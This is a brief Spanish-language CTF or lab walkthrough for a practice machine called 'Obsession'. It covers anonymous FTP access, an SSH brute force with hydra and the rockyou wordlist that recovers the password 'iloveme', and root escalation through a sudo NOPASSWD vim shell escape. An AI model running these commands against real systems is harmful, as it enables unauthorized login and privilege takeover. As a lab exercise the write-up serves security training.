# Obsession

Hay un ftp con acceso anónimo habilitado. Se entra al ftp con *Anonymous* y sin pswd
*ftp-anon: Anonymous FTP login allowed (FTP code 230)*
*-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt*
*-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt*

`ftp> get chat-gonza.txt`
`ftp> get pendientes.txt`

Se ve que el usuario es un tal *Russoski*
`hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
**iloveme**

## Escalada

`sudo -l
*(root) NOPASSWD: /usr/bin/vim*

`sudo vim -c ':!/bin/sh'`
ó
`sudo vim -c ':!/bin/bash'`
